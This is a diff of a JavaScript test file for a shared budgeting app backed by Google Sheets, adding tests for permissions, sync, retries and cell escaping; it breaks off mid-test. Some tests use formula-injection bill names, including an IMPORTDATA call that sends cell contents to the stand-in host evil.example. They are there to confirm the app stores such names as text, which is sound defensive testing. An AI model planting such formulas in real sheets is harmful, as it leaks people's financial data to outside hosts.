@@ -71,6 +71,15 @@ c.refreshBudgetTabs();
 ok("budget tabs written", env.sheets["Ethan budget"] && env.sheets["Sophie budget"] && env.sheets["Ethan budget"]._s.cells.length > 10);
 const eb = env.sheets["Ethan budget"]._s.cells.map(r => r[0]);
 ok("budget tab has sections", ["Money in", "Bills", "Spending", "Savings"].every(x => eb.includes(x)), eb);
+// a bill named like a formula goes into the budget tab as plain text
+{ const evil = '=IMPORTDATA("https://evil.example/?d="&A1)';
+  const sb = c.readTable_("bills").rows.find(r => r.person === "sophie");
+  call({key: env.props.KEY_sophie, ops: [{op: "put", table: "bills", row: Object.assign({}, sb, {_row: undefined, name: evil})}]});
+  // look at exactly what's handed to the sheet (the fake, like Sheets, hides a leading apostrophe once stored)
+  const sh = env.sheets["Sophie budget"], gr = sh.getRange, sent = [];
+  sh.getRange = function () { const rg = gr.apply(sh, arguments), sv = rg.setValues; rg.setValues = (v) => { v.forEach(row => row.forEach(x => sent.push(x))); return sv(v); }; return rg; };
+  c.CACHE_ = {}; c.refreshBudgetTabs(); sh.getRange = gr;
+  ok("S10b: names in the budget tabs can't be formulas", sent.indexOf("'" + evil) >= 0 && sent.indexOf(evil) < 0, sent.filter(x => /IMPORT/.test(String(x)))); }
 
 // connect links
 c.WEB_APP_URL = "https://script.google.com/macros/s/TEST/exec";
@@ -279,6 +288,13 @@ const phone = (F, k) => { const P = {T: {}, since: 0}; P.sync = (ops) => { const
   ok("S1b: and nothing else", w.rejected.map(x => x.i).join() === "1,2,3,4,5,6,7,8,9,10,11,12,13" && w.rejected.every(x => x.error.indexOf("That's not allowed with this link") === 0), w.rejected);
   ok("S1b: not a fun budget, her account, a lopsided split, review flags, a huge amount or her budget", ["only your food budget", "only your own account", "split half each", "(review)", "amount or date", "only your food budget"].every((bit, j) => w.rejected[7 + j].error.indexOf(bit) > 0), w.rejected.slice(7));
   const far = call({key: kP, ops: [{op: "put", table: "transactions", row: {id: "t-pk-far", date: "2031-01-01", person: "ethan", amount: 5, budget: "e-food-b", source: "peckish"}}]});
+  // a Peckish date is a real day: a time after it is dropped, anything else is turned down (it would never count)
+  const pkd = (id, date) => call({key: kP, ops: [{op: "put", table: "transactions", row: {id, date, person: "ethan", amount: 5, budget: "e-food-b", source: "peckish"}}]});
+  const dOk = pkd("t-pk-time", new Date().toISOString().slice(0, 10) + "T09:15:00Z"), dRow = (c.CACHE_ = {}, c.readTable_("transactions").rows.find(x => x.id === "t-pk-time"));
+  ok("S1b: a Peckish shop with a time on its date is saved as that day", dOk.applied.length === 1 && dRow && dRow.date === new Date().toISOString().slice(0, 10), dRow);
+  ok("S1b: a Peckish date with anything else after the day is turned down", ["2026-10-28junk", "2026-10-28 <b>", "2026-10-28" + "x".repeat(500)].every((d, i) => pkd("t-pk-junk" + i, d).rejected.length === 1));
+  ok("S1b: a Peckish date that isn't in its month is turned down", pkd("t-pk-feb2", new Date().toISOString().slice(0, 7) + "-32").rejected.length === 1);
+  call({key: kP, ops: [{op: "delete", table: "transactions", id: "t-pk-time"}]});
   ok("S1b: not dated years ahead", far.rejected.length === 1 && /amount or date/.test(far.rejected[0].error), far.rejected);
   // a shop the bank has matched to a real payment: Peckish can't clear its review flag, and taking it off keeps the payment
   c.CACHE_ = {}; c.applyOne_("ethan", {op: "put", table: "transactions", row: {id: "t-pk-10", bankId: "monzo:tx_1", review: true}}, Date.now(), "bank", {sys: true}); c.CACHE_ = {};
@@ -394,6 +410,302 @@ const phone = (F, k) => { const P = {T: {}, since: 0}; P.sync = (ops) => { const
   ok("S10: and read back as typed", rows.find(r => r.id === "t-f1").note === " =IMPORTDATA(\"https://x\")" && rows.find(r => r.id === "t-f2").note === "'quoted'");
 }
 
+// R4: a joint goal made just one person's, and a balance moved off a LISA, leave the other phone
+{
+  const B = require("../engine.js");
+  const F = fresh(t => t.valuations.push({id: "v-l2", account: "e-lisa", date: "2026-10-27", amount: 10100}));
+  const S = phone(F, F.kS); S.sync();
+  ok("R4: Sophie has the joint goal and Ethan's LISA balance", B.load(S.T).goals.some(g => g.id === "house") && B.load(S.T).valuations.some(v => v.id === "v-l2"));
+  wait(5100);
+  const r = F.call({key: F.kE, ops: [{op: "put", table: "goals", row: {id: "house", owners: "ethan"}}, {op: "put", table: "valuations", row: {id: "v-l2", account: "e-isa"}}]});
+  ok("R4: Ethan's changes saved", r.applied.length === 2, r);
+  const j = S.sync();
+  ok("R4: Sophie's next sync is only changes", j.ok && !j.full, j);
+  ok("R4: the goal has gone from her phone", !B.load(S.T).goals.some(g => g.id === "house"), S.T.goals);
+  ok("R4: and so has the balance", !B.load(S.T).valuations.some(v => v.id === "v-l2"), S.T.valuations);
+  ok("R4: Ethan still has both", (() => { const E = phone(F, F.kE); E.sync(); return B.load(E.T).goals.some(g => g.id === "house") && B.load(E.T).valuations.some(v => v.id === "v-l2"); })());
+}
+
+// R5: a regular payment is the payer's to change: the one it's paid to can't change, skip or stop it
+{
+  const F = fresh();
+  const r = F.call({key: F.kE, ops: [
+    {op: "put", table: "transfers", row: {id: "s-to-e-rent", amount: 900}},
+    {op: "put", table: "exceptions", row: {id: "x-s-to-e-rent-2026-11-13-skip", item: "s-to-e-rent", date: "2026-11-13", action: "skip"}},
+    {op: "put", table: "amounts", row: {id: "amt-e1", item: "s-to-e-rent", start: "2026-12-01", amount: 1}},
+    {op: "put", table: "transfers", row: {id: "e-new", from: "sophie", to: "ethan", name: "Made up", amount: 50, unit: "month", on: "1", start: "2026-11-01"}},
+    {op: "delete", table: "transfers", id: "s-to-e-bills"}]});
+  ok("R5: Ethan can't change Sophie's payments to him", r.rejected.length === 5 && !r.applied.length, r);
+  F.c.CACHE_ = {};
+  ok("R5: and they're as they were", F.c.readTable_("transfers").rows.find(x => x.id === "s-to-e-rent").amount === 500 && !F.c.readTable_("transfers").rows.some(x => x.id === "e-new") && !F.c.readTable_("exceptions").rows.some(x => x.item === "s-to-e-rent"));
+  const s = F.call({key: F.kS, ops: [{op: "put", table: "transfers", row: {id: "s-to-e-rent", amount: 520}}, {op: "put", table: "exceptions", row: {id: "x-s-to-e-rent-2026-11-13-skip", item: "s-to-e-rent", date: "2026-11-13", action: "skip"}}]});
+  ok("R5: Sophie can", s.applied.length === 2 && !s.rejected.length, s);
+}
+
+// R7: a name that looks like a formula reaches the budget tabs as text
+{
+  const F = fresh();
+  F.call({key: F.kS, ops: [{op: "put", table: "bills", row: {id: "s-evil", person: "sophie", name: "=IMPORTXML(\"https://x.example/?\"&'Ethan budget'!B5,\"//a\")", amount: 1, account: "s-main", unit: "month", on: "3", start: "2026-11-01"}}]});
+  F.c.refreshBudgetTabs();
+  const sh = F.env.sheets["Sophie budget"], raw = [], gr = sh.getRange;
+  sh.getRange = (...a) => { const g = gr(...a), sv = g.setValues; g.setValues = (v) => { raw.push(...v); return sv(v); }; return g; };
+  F.c.refreshBudgetTabs();
+  const cellsWith = raw.flat().filter(v => typeof v === "string" && /IMPORTXML/.test(v));
+  ok("R7: the formula-looking bill name is written as text", cellsWith.length > 0 && cellsWith.every(v => v.charAt(0) === "'"), cellsWith);
+  ok("R7: numbers stay numbers", raw.flat().some(v => typeof v === "number"));
+}
+
+// R8: a split taken off by typing in the sheet leaves the partner's phone too
+{
+  const B = require("../engine.js");
+  const F = fresh(t => t.transactions.push({id: "sx2", date: "2026-10-27", person: "sophie", amount: 60, budget: "s-food", account: "s-main", split: "half"}));
+  const E = phone(F, F.kE); E.sync();
+  ok("R8: Ethan has Sophie's split shop", B.load(E.T).transactions.some(x => x.id === "sx2"));
+  wait(5100);
+  const sh = F.env.sheets.transactions, head = sh._s.cells[0], ri = sh._s.cells.findIndex(x => x[0] === "sx2");
+  sh._s.cells[ri][head.indexOf("split")] = "";
+  F.c.CACHE_ = {}; F.c.onEdit({range: {getSheet: () => sh, getRow: () => ri + 1, getLastRow: () => ri + 1, getColumn: () => head.indexOf("split") + 1, getLastColumn: () => head.indexOf("split") + 1}});
+  wait(5100); const j = E.sync();
+  ok("R8: his next sync fetches everything once", j.ok && j.full === true, j.full);
+  ok("R8: and the now-private shop has gone", !B.load(E.T).transactions.some(x => x.id === "sx2"));
+  ok("R8: after that, only changes again", E.sync().full === false);
+}
+
+// R9: a change the sheet couldn't save for a passing reason (a Google hiccup) comes back to be sent again, and so
+// does everything after it in the batch (untried), so changes keep their order; a refusal is final
+{
+  const F = fresh(), sh = F.env.sheets.transactions, real = sh.appendRow; let once = true;
+  sh.appendRow = (row) => { if (once) { once = false; throw new Error("Service Spreadsheets timed out while accessing document"); } return real(row); };
+  const j = F.call({key: F.kE, ops: [{op: "put", table: "transactions", row: {id: "t-notmine", date: "2026-10-28", person: "sophie", amount: 3, budget: "s-food"}},
+    {op: "put", table: "transactions", row: {id: "t-hiccup", date: "2026-10-28", person: "ethan", amount: 3, budget: "e-fun"}},
+    {op: "put", table: "transactions", row: {id: "t-hiccup", amount: 4}}]});
+  const r = j.rejected || [];
+  ok("R9: a refusal is final", r[0] && r[0].i === 0 && r[0].retry === false, r);
+  ok("R9: a hiccup is sent back to try again", r[1] && r[1].i === 1 && r[1].retry === true && !r[1].notTried, r);
+  ok("R9: and what came after it isn't tried yet, so it can't be undone by the retry", r[2] && r[2].i === 2 && r[2].retry === true && r[2].notTried === true && !F.c.readTable_("transactions").rows.some(x => x.id === "t-hiccup"), r);
+  const j2 = F.call({key: F.kE, ops: [{op: "put", table: "transactions", row: {id: "t-hiccup", date: "2026-10-28", person: "ethan", amount: 3, budget: "e-fun"}}, {op: "put", table: "transactions", row: {id: "t-hiccup", amount: 4}}]});
+  F.c.CACHE_ = {};
+  ok("R9: sent again, both are saved, in order", j2.applied.length === 2 && +F.c.readTable_("transactions").rows.find(x => x.id === "t-hiccup").amount === 4, j2);
+}
+
+// R10: a phone that hasn't synced for longer than the list of rows to drop is kept fetches everything
+{
+  const F = fresh(t => {
+    t.transactions.push({id: "sx-old", date: "2026-08-01", person: "sophie", amount: 30, budget: "s-food", account: "s-main"});
+    t.transactions.push({id: "sx-new", date: "2026-10-27", person: "sophie", amount: 20, budget: "s-food", account: "s-main", split: "half"});
+  });
+  const now = Date.now(), old = now - 61 * 86400000;
+  // sx-old was split until 61 days ago, when Sophie made it private; Ethan's phone last synced the day before that
+  F.env.props.HIDDEN_ROWS = JSON.stringify([{t: "transactions", i: "sx-old", q: "ethan", a: old}]);
+  F.call({key: F.kS, ops: [{op: "put", table: "transactions", row: {id: "sx-new", split: ""}}]});
+  const j = F.call({key: F.kE, since: old - 86400000});
+  ok("R10: the old phone fetches everything, so the row made private goes", j.ok && j.full === true && !j.rows.transactions.some(x => x.id === "sx-old"), {full: j.full});
+}
+
+// R11: refreshing the budget tabs keeps one warning on each, not one more every time
+{
+  const F = fresh();
+  for (let i = 0; i < 3; i++) F.c.refreshBudgetTabs();
+  const tab = F.env.sheets["Ethan budget"];
+  ok("R11: one protection on the budget tab after three refreshes", tab && tab._s.protections.length === 1, tab && tab._s.protections.length);
+}
+
+// R12: text the sheet would turn into a date, time or number is kept as typed; a list is written as text
+{
+  const F = fresh(), c = F.c;
+  const cases = {"1/2": "'1/2", "£12": "'£12", "50%": "'50%", "2:30": "'2:30", "5 Nov": "'5 Nov", "Thu 29 Oct": "'Thu 29 Oct", "1,234": "'1,234",
+    "2026-10-28": "2026-10-28", "12.50": "12.50", "Tesco": "Tesco", "24/7 Store": "24/7 Store", "ethan:2, sophie:1": "ethan:2, sophie:1", "x-e-pay-2026-10-29-amount": "x-e-pay-2026-10-29-amount"};
+  const bad = Object.keys(cases).filter(k => c.cell_(k) !== cases[k]).map(k => [k, c.cell_(k)]);
+  ok("R12: text stays text", !bad.length, bad);
+  const numLike = {"007": "'007", "1e5": "'1e5", "+5": "'+5", ".5": "'.5", "00": "'00", "-0012": "'-0012", "0.5": "0.5", "0": "0", "-3.25": "-3.25", "120": "120"};
+  const badN = Object.keys(numLike).filter(k => c.cell_(k) !== numLike[k]).map(k => [k, c.cell_(k)]);
+  ok("R12: text the sheet would read as a different number (007, 1e5) is kept as typed; plain numbers stay numbers", !badN.length, badN);
+  ok("R12: a list or object is written as text, never as a formula", c.cell_(["=IMPORTDATA(1)"]) === '["=IMPORTDATA(1)"]' && typeof c.cell_({a: 1}) === "string" && c.cell_(new Date(0)) instanceof Date);
+  F.call({key: F.kE, ops: [{op: "put", table: "transactions", row: {id: "t-note", date: "2026-10-28", person: "ethan", amount: 2, budget: "e-fun", note: "1/2"}}]});
+  F.c.CACHE_ = {};
+  ok("R12: and comes back as typed", F.c.readTable_("transactions").rows.find(x => x.id === "t-note").note === "1/2");
+}
+
+// R13: Caledonite only calls income a payday (a bill called "Payday loan" is a bill)
+{
+  const F = fresh(t => t.bills.push({id: "e-pdl", person: "ethan", name: "Payday loan", amount: 50, account: "e-main", unit: "month", on: "3", start: "2026-11-01"}));
+  const j = F.call({key: F.kE, action: "app.calendar"}), all = [].concat(...Object.values(j.days || {}));
+  const pdl = all.filter(x => x.name === "Payday loan");
+  ok("R13: the bill is shown as a bill", pdl.length > 0 && pdl.every(x => !x.pay && /^Bill/.test(x.sub)), pdl);
+}
+
+// R14: a payment comes out of your own account, and a pot move is between your own accounts
+{
+  const F = fresh(t => t.transactions.push({id: "t-legacy", date: "2026-10-27", person: "ethan", amount: 5, budget: "e-fun", account: "s-main"}));
+  const tx = (id, account) => ({op: "put", table: "transactions", row: {id, date: "2026-10-28", person: "ethan", amount: 4, budget: "e-fun", account}});
+  const mv = (id, from, to) => ({op: "put", table: "moves", row: {id, date: "2026-10-28", person: "ethan", from, to, amount: 10, key: "k:" + id}});
+  const j = F.call({key: F.kE, ops: [tx("t-own", "e-food"), tx("t-blank", ""), tx("t-hers", "s-main"), tx("t-nowhere", "x-made-up"),
+    mv("m-own", "e-main", "e-lisa"), mv("m-to-hers", "e-main", "s-savings"), mv("m-from-hers", "s-main", "e-main"), mv("m-warn", "", "")]});
+  const rej = (j.rejected || []).map(r => r.id), app = (j.applied || []).map(r => r.id);
+  ok("R14: own accounts and blanks are saved", ["t-own", "t-blank", "m-own", "m-warn"].every(x => app.indexOf(x) >= 0), j.applied);
+  ok("R14: the partner's (or a made-up) account is turned down, for good", ["t-hers", "t-nowhere", "m-to-hers", "m-from-hers"].every(x => rej.indexOf(x) >= 0) && j.rejected.every(r => r.retry === false), j.rejected);
+  const k = F.call({key: F.kE, ops: [{op: "put", table: "transactions", row: {id: "t-own", account: "s-rent"}}, {op: "delete", table: "transactions", id: "t-legacy"}]});
+  ok("R14: an existing payment can't be moved onto the partner's account", k.rejected.length === 1 && k.rejected[0].id === "t-own", k.rejected);
+  ok("R14: an old payment on the wrong account can still be taken off", k.applied.some(r => r.id === "t-legacy"), k.applied);
+  // Sophie: her own accounts are fine, Ethan's aren't
+  const s = F.call({key: F.kS, ops: [{op: "put", table: "moves", row: {id: "m-s", date: "2026-10-28", person: "sophie", from: "s-main", to: "s-savings", amount: 5, key: "k:s"}},
+    {op: "put", table: "moves", row: {id: "m-s2", date: "2026-10-28", person: "sophie", from: "s-main", to: "e-lisa", amount: 5, key: "k:s2"}}]});
+  ok("R14: the same for Sophie", s.applied.some(r => r.id === "m-s") && s.rejected.length === 1 && s.rejected[0].id === "m-s2", s);
+  // the bank feed's own writes aren't held to it
+  F.c.CACHE_ = {}; F.c.applyOne_("ethan", {op: "put", table: "transactions", row: {id: "bk-x", date: "2026-10-28", person: "ethan", amount: 1, account: "e-main"}}, Date.now(), "bank", {sys: true});
+  ok("R14: the bank feed still writes", F.c.readTable_("transactions").rows.some(x => x.id === "bk-x"));
+}
+
+// R15 a yearly bill with "put a bit by" turned off keeps that choice in the sheet (it used to be dropped)
+{
+  const F = fresh();
+  F.call({key: F.kE, ops: [{op: "put", table: "bills", row: {id: "e-ins", person: "ethan", name: "Car insurance", amount: 600, account: "e-car", unit: "year", start: "2027-03-01", setAside: false}}]});
+  const back = F.call({key: F.kE, full: true}).rows.bills.find(b => b.id === "e-ins") || {};
+  ok("R15: setAside off is saved in the sheet", back.setAside === false || /^false$/i.test(String(back.setAside)), back);
+  ok("R15: and the engine reads it back as off", B.load({bills: [back]}).bills[0].setAside === false, back);
+}
+
+// R16 everything that names an account uses the account of the person on that side (not just payments and moves),
+// so a partner's phone can't take money out of the other's pots on paper
+{
+  const F = fresh();
+  const tr = (id, fromAccount, toAccount) => ({op: "put", table: "transfers", row: {id, from: "sophie", to: "ethan", name: "Share", amount: 40, fromAccount, toAccount, unit: "month", on: "1", start: "2026-11-01"}});
+  const s = F.call({key: F.kS, ops: [tr("tr-ok", "s-rent", "e-bills"), tr("tr-blank", "", ""), tr("tr-from-his", "e-emergency", "e-bills"), tr("tr-to-hers", "s-rent", "s-main"),
+    {op: "put", table: "bills", row: {id: "s-bill-his", person: "sophie", name: "Gym2", amount: 30, account: "e-main", unit: "month", on: "2", start: "2026-11-01", split: "half"}},
+    {op: "put", table: "income", row: {id: "s-inc-his", person: "sophie", name: "Gift", amount: 30, account: "e-lisa", unit: "once", start: "2026-11-02"}},
+    {op: "put", table: "budgets", row: {id: "s-bud-his", person: "sophie", name: "Fuel", amount: 30, mode: "daily", account: "e-car"}},
+    {op: "put", table: "settlements", row: {id: "st-ok", date: "2026-10-28", from: "sophie", to: "ethan", amount: 5, fromAccount: "s-main", toAccount: "e-main"}},
+    {op: "put", table: "loans", row: {id: "ln-ok", lender: "sophie", borrower: "ethan", name: "Tickets", amount: 50, date: "2026-10-28", account: "s-main"}},
+    {op: "put", table: "loans", row: {id: "ln-borrower", lender: "ethan", borrower: "sophie", name: "Bike", amount: 50, date: "2026-10-28", account: "s-main"}}]});
+  const app = (s.applied || []).map(r => r.id), rej = (s.rejected || []).map(r => r.id);
+  ok("R16: the right people's accounts (and blanks) are saved", ["tr-ok", "tr-blank", "st-ok", "ln-ok"].every(x => app.indexOf(x) >= 0), s.applied);
+  ok("R16: the other person's accounts are turned down, for good", ["tr-from-his", "tr-to-hers", "s-bill-his", "s-inc-his", "s-bud-his", "ln-borrower"].every(x => rej.indexOf(x) >= 0) && s.rejected.every(r => r.retry === false), s.rejected);
+  const e = F.call({key: F.kE, ops: [{op: "put", table: "settlements", row: {id: "st-hers", date: "2026-10-28", from: "sophie", to: "ethan", amount: 50, fromAccount: "s-savings", toAccount: "e-main"}},
+    {op: "put", table: "settlements", row: {id: "st-mine", date: "2026-10-28", from: "sophie", to: "ethan", amount: 50, toAccount: "e-main"}}]});
+  ok("R16: Ethan can't log a payment out of Sophie's savings, only into his own", e.rejected.length === 1 && e.rejected[0].id === "st-hers" && /Sophie/.test(e.rejected[0].error) && e.applied.some(r => r.id === "st-mine"), e);
+  const l = F.call({key: F.kE, ops: [{op: "put", table: "loans", row: {id: "ln-e", lender: "ethan", borrower: "sophie", name: "Bike", amount: 80, date: "2026-10-28", account: "e-main"}},
+    {op: "put", table: "loans", row: {id: "ln-s", lender: "sophie", borrower: "ethan", name: "Coat", amount: 80, date: "2026-10-28", account: "s-savings"}}]});
+  ok("R16: a loan is paid from the lender's account, and only the lender says which", l.applied.some(r => r.id === "ln-e") && l.rejected.length === 1 && l.rejected[0].id === "ln-s", l);
+  const l2 = F.call({key: F.kS, ops: [{op: "put", table: "loans", row: {id: "ln-e", lender: "ethan", borrower: "sophie", name: "Bike (red)", amount: 80, date: "2026-10-28", account: "e-main"}}]});
+  ok("R16: the borrower can still change the rest of a loan that names the lender's account", l2.applied.length === 1, l2);
+}
+
+// R17 a private bill that becomes shared brings its price change and its skipped month to the partner's phone
+// on an ordinary sync, so both phones work out what's owed the same
+{
+  const F = fresh(), real = Date.now; let T = real(); Date.now = () => T;
+  try {
+    F.call({key: F.kE, ops: [{op: "put", table: "bills", row: {id: "e-bb", person: "ethan", name: "Broadband", amount: 30, account: "e-bills", unit: "month", on: "3", start: "2026-11-01"}},
+      {op: "put", table: "amounts", row: {id: "amt-bb", item: "e-bb", start: "2026-12-01", amount: 45}}, {op: "put", table: "exceptions", row: {id: "x-e-bb-2027-01-03-skip", item: "e-bb", date: "2027-01-03", action: "skip"}}]});
+    T += 60000; const S = phone(F, F.kS); S.sync();
+    ok("R17: (Sophie can't see the private bill or its changes)", !S.T.bills.some(b => b.id === "e-bb") && !S.T.amounts.some(a => a.id === "amt-bb"));
+    T += 60000; F.call({key: F.kE, ops: [{op: "put", table: "bills", row: {id: "e-bb", person: "ethan", name: "Broadband", amount: 30, account: "e-bills", unit: "month", on: "3", start: "2026-11-01", split: "half"}}]});
+    T += 60000; const j = S.sync();
+    ok("R17: once it's shared, its price change and skip arrive with it", !j.full && S.T.bills.some(b => b.id === "e-bb") && S.T.amounts.some(a => a.id === "amt-bb") && S.T.exceptions.some(x => x.id === "x-e-bb-2027-01-03-skip"), {full: j.full, a: j.rows.amounts, x: j.rows.exceptions});
+    const E = phone(F, F.kE); E.sync();
+    const owed = (P, p) => { const d = B.load(P.T, "2027-02-10"); return B.between(d, p, "2027-02-10").net; };
+    ok("R17: and both phones agree on what's owed", Math.abs(owed(E, "ethan") + owed(S, "sophie")) < 0.005, [owed(E, "ethan"), owed(S, "sophie")]);
+  } finally { Date.now = real; }
+}
+
+// R18 text too long for a cell is turned down for good, so it doesn't hold up the changes after it
+{
+  const F = fresh(), tx = (id, note) => ({op: "put", table: "transactions", row: {id, date: "2026-10-28", person: "ethan", amount: 3, budget: "e-fun", account: "e-main", note}});
+  const j = F.call({key: F.kE, ops: [tx("t-long", "x".repeat(60000)), tx("t-after", "fine")]});
+  ok("R18: a 60,000-character note is turned down, not retried", j.rejected.length === 1 && j.rejected[0].id === "t-long" && j.rejected[0].retry === false, j.rejected);
+  ok("R18: and the next change is still saved", j.applied.some(r => r.id === "t-after"), j.applied);
+}
+
+// R19 (1.4.4) you both tick the same settling up before your phones catch up: it only counts once,
+// but settling up again later for something new still counts
+{
+  const F = fresh(), d = "2026-10-28", B = F.c.Budgie;
+  const pay = (id, amt) => ({op: "put", table: "transactions", row: {id, date: d, person: "ethan", amount: amt, budget: "e-fun", account: "e-main", split: "half"}});
+  const settle = (id, amt) => ({op: "put", table: "settlements", row: {id, date: d, from: "sophie", to: "ethan", amount: amt, key: "split:" + d, note: "Settled up"}});
+  F.call({key: F.kE, ops: [pay("t-lunch", 40)]});
+  F.call({key: F.kS, ops: [settle("set-s", 20)]});   // Sophie: "I've paid"
+  F.call({key: F.kE, ops: [settle("set-e", 20)]});   // Ethan, before his phone heard: "it's arrived"
+  const owed = () => { F.c.CACHE_ = {}; return B.between(B.load(F.c.allTables_(), d), "ethan", d).net; };
+  const rows = () => { F.c.CACHE_ = {}; return F.c.readTable_("settlements").rows; };
+  ok("R19: the second tick is kept, marked as a copy", (rows().find(r => r.id === "set-e") || {}).deleted === true && /Same settling up as set-s/.test((rows().find(r => r.id === "set-e") || {}).note), rows().find(r => r.id === "set-e"));
+  ok("R19: so they're all square, not owing it back", Math.abs(owed()) < 0.005, owed());
+  F.call({key: F.kE, ops: [pay("t-dinner", 40)]});
+  F.call({key: F.kS, ops: [settle("set-s2", 20)]});
+  ok("R19: settling up again for something new still counts", !rows().find(r => r.id === "set-s2").deleted && Math.abs(owed()) < 0.005, owed());
+}
+
+// ================= review 2026-10-26 (1.4.5) =================
+// A1: you both ticking the same loan repayment (one offline) only pays it off once
+{
+  const F = fresh(), key = "loan:sofa:2026-12-28";
+  F.call({key: F.kS, ops: [{op: "put", table: "settlements", row: {id: "set-paid", date: "2026-12-28", from: "sophie", to: "ethan", amount: 200, loan: "sofa", key}}]});
+  const r = F.call({key: F.kE, ops: [{op: "put", table: "settlements", row: {id: "set-arrived", date: "2026-12-29", from: "sophie", to: "ethan", amount: 200, loan: "sofa", key}}]});
+  const L = B.load(F.call({key: F.kE, full: true}).rows, "2026-12-30");
+  ok("A1: the second tick of one loan repayment is kept as a copy", r.applied.length === 1 && (F.c.readTable_("settlements").rows.find(x => x.id === "set-arrived") || {}).deleted === true, r);
+  ok("A1: so the loan has £400 left, not £200", B.loans(L, "ethan", "2026-12-30")[0].left === 400, B.loans(L, "ethan", "2026-12-30")[0]);
+  // the next month's repayment is a different one
+  const r2 = F.call({key: F.kE, ops: [{op: "put", table: "settlements", row: {id: "set-jan", date: "2027-01-28", from: "sophie", to: "ethan", amount: 200, loan: "sofa", key: "loan:sofa:2027-01-28"}}]});
+  ok("A1: next month's repayment still counts", r2.applied.length === 1 && !(F.c.readTable_("settlements").rows.find(x => x.id === "set-jan") || {}).deleted);
+}
+
+// A3: a refusal reads the same whether the other one's row is there or not, so it can't be used to find out about it
+{
+  const F = fresh();
+  F.call({key: F.kE, ops: [
+    {op: "put", table: "settings", row: {id: "ethan:bank.rule.corner shop", person: "ethan", key: "bank.rule.corner shop", value: "e-fun"}},
+    {op: "put", table: "exceptions", row: {id: "x-e-phone-2026-11-05-skip", item: "e-phone", date: "2026-11-05", action: "skip"}},
+    {op: "put", table: "transactions", row: {id: "t-e-secret", date: "2026-11-01", person: "ethan", amount: 5, budget: "e-fun", account: "e-main"}}]});
+  const errs = (ops) => F.call({key: F.kS, ops}).rejected.map(r => r.error);
+  const there = errs([
+    {op: "put", table: "settings", row: {id: "ethan:bank.rule.corner shop", person: "sophie", key: "bank.rule.corner shop", value: "x"}},
+    {op: "put", table: "exceptions", row: {id: "x-e-phone-2026-11-05-skip", item: "s-gym", date: "2026-11-05", action: "skip"}},
+    {op: "delete", table: "exceptions", id: "x-e-phone-2026-11-05-skip"},
+    {op: "put", table: "transactions", row: {id: "t-e-secret", account: "s-main"}}]);
+  const notThere = errs([
+    {op: "put", table: "settings", row: {id: "ethan:bank.rule.other shop", person: "sophie", key: "bank.rule.other shop", value: "x"}},
+    {op: "put", table: "exceptions", row: {id: "x-e-phone-2026-12-05-skip", item: "s-gym", date: "2026-12-05", action: "skip"}},
+    {op: "delete", table: "exceptions", id: "x-e-phone-2026-12-05-skip"},
+    {op: "put", table: "transactions", row: {id: "t-nothing-here", account: "s-main"}}]);
+  ok("A3: the same answer for the other one's rows whether they exist or not", there.length === 4 && JSON.stringify(there.map(e => e.replace(/\(.*\)/, ""))) === JSON.stringify(notThere.map(e => e.replace(/\(.*\)/, ""))), {there, notThere});
+  ok("A3: and it reads as plain English", notThere.every(e => !/they's/.test(e)), notThere);
+  // your own changes are unaffected
+  const mine = F.call({key: F.kS, ops: [{op: "put", table: "settings", row: {id: "sophie:theme.mode", person: "sophie", key: "theme.mode", value: "dark"}}, {op: "put", table: "exceptions", row: {id: "x-s-gym-2026-12-16-skip", item: "s-gym", date: "2026-12-16", action: "skip"}}]});
+  ok("A3: your own settings and changes still save", mine.applied.length === 2 && !mine.rejected.length, mine.rejected);
+}
+
+// R1: Caledonite's amounts are rounded the same way as Budgie's
+{ const F = fresh(); ok("R1: calendar money rounds halves as Budgie does", [F.c.calMoney_(10.075), F.c.calMoney_(1.005), F.c.calMoney_(1200), F.c.calMoney_(-2.5)].join() === "£10.08,£1.01,£1,200,-£2.5", [F.c.calMoney_(10.075), F.c.calMoney_(1.005), F.c.calMoney_(1200), F.c.calMoney_(-2.5)]); }
+
+// R2: a budget tab refresh that keeps failing is tried at most once a minute, not after every change
+{
+  const F = fresh(), real = F.c.refreshBudgetTabs; let n = 0;
+  F.env.props.VIEWS_AT = "0"; F.c.refreshBudgetTabs = () => { n++; throw new Error("tab name too long"); };
+  const w = i => F.call({key: F.kE, ops: [{op: "put", table: "transactions", row: {id: "t-r2-" + i, date: "2026-10-27", person: "ethan", amount: 1, budget: "e-fun", account: "e-main"}}]});
+  const a = w(1), b2 = w(2), c3 = w(3);
+  ok("R2: a failing refresh is tried once in a minute, and the changes still save", n === 1 && a.applied.length === 1 && b2.applied.length === 1 && c3.applied.length === 1 && /tab name too long/.test(a.viewError || ""), {n, a: a.viewError});
+  F.c.refreshBudgetTabs = real;
+}
+
+// R3: a new row with an id too long for a cell is turned down, so it can't hold up the changes after it
+{
+  const F = fresh(), long = "t-" + "x".repeat(60000);
+  const r = F.call({key: F.kE, ops: [{op: "put", table: "transactions", id: long, row: {date: "2026-10-27", person: "ethan", amount: 1, budget: "e-fun", account: "e-main"}}, {op: "put", table: "transactions", row: {id: "t-after-long", date: "2026-10-27", person: "ethan", amount: 2, budget: "e-fun", account: "e-main"}}]});
+  ok("R3: an id too long is refused for good (not retried), and the next change still saves", r.rejected.length === 1 && r.rejected[0].retry === false && r.applied.length === 1 && r.applied[0].id === "t-after-long", r.rejected.map(x => [x.error, x.retry]));
+}
+
+// W6: a setting's id ("ethan:share.payments") and a one-date change's id ("x-e-rent-2026-12-15-skip") can't be taken
+// ahead of time in another tab by the other one of you, which would stop the owner making that setting or change
+{
+  const F = fresh();
+  const sq = F.call({key: F.kS, ops: [{op: "put", table: "transactions", row: {id: "ethan:share.payments", date: "2026-10-27", person: "sophie", amount: 1, budget: "s-fun", account: "s-main"}},
+    {op: "put", table: "gifts", row: {id: "ethan:bank.map.pot_bills", person: "sophie", name: "x"}},
+    {op: "put", table: "transactions", row: {id: "x-e-rent-2026-12-15-skip", date: "2026-10-27", person: "sophie", amount: 1, budget: "s-fun", account: "s-main"}},
+    {op: "put", table: "transactions", row: {id: "t-r4-hers", date: "2026-10-27", person: "sophie", amount: 1, budget: "s-fun", account: "s-main"}}]});
+  ok("W6: those ids are refused in other tabs (her own payment still saves)", sq.rejected.map(x => x.i).join() === "0,1,2" && sq.applied.map(x => x.id).join() === "t-r4-hers" && sq.rejected.every(x => /can't change that/.test(x.error)), sq);
+  const e = F.call({key: F.kE, ops: [{op: "put", table: "settings", row: {person: "ethan", key: "share.payments", value: "true"}}, {op: "put", table: "exceptions", row: {id: "x-e-rent-2026-12-15-skip", item: "e-rent", date: "2026-12-15", action: "skip"}}]});
